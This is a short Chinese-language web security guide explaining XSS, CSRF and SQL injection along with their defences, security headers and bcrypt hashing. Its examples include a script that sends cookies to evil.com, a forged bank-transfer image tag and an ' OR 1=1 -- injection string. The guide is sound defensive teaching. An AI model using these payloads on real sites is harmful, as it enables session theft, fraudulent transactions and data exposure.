# Web 安全防护

## 常见攻击与防御

### XSS（跨站脚本攻击）

攻击者在页面中注入恶意脚本，窃取用户信息。

```html
<!-- 用户输入的评论 -->
<script>fetch('https://evil.com?cookie=' + document.cookie)</script>
```

防御：
- 对用户输入进行转义（`<` → `&lt;`）
- 使用 CSP（Content Security Policy）限制脚本来源
- React/Vue 默认会转义，但 `dangerouslySetInnerHTML` / `v-html` 要小心

### CSRF（跨站请求伪造）

攻击者诱导用户点击链接，以用户身份发送请求。

```html
<!-- 恶意网站上的图片 -->
<img src="https://bank.com/transfer?to=hacker&amount=10000" />
```

防御：
- 使用 CSRF Token
- 检查 Referer / Origin 头
- SameSite Cookie 属性

### SQL 注入

攻击者通过输入构造恶意 SQL。

```sql
-- 用户输入：' OR 1=1 --
SELECT * FROM users WHERE name = '' OR 1=1 --'
```

防御：永远使用参数化查询，不要拼接 SQL。

```javascript
// 差
db.query(`SELECT * FROM users WHERE name = '${name}'`)

// 好
db.query('SELECT * FROM users WHERE name = ?', [name])
```

## 安全 Headers

```
Content-Security-Policy: default-src 'self'
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
Strict-Transport-Security: max-age=31536000
```

## 密码存储

永远不要明文存储密码。

```javascript
import bcrypt from 'bcrypt'

// 加密
const hash = await bcrypt.hash(password, 10)

// 验证
const match = await bcrypt.compare(password, hash)
```

## 安全清单

- 所有用户输入都不可信，必须验证和转义
- 使用 HTTPS
- 密码用 bcrypt/argon2 哈希存储
- 敏感配置用环境变量，不要提交到代码仓库
- 定期更新依赖（`npm audit`）
- 最小权限原则

> 安全不是事后补救，而是从第一行代码就要考虑的事。
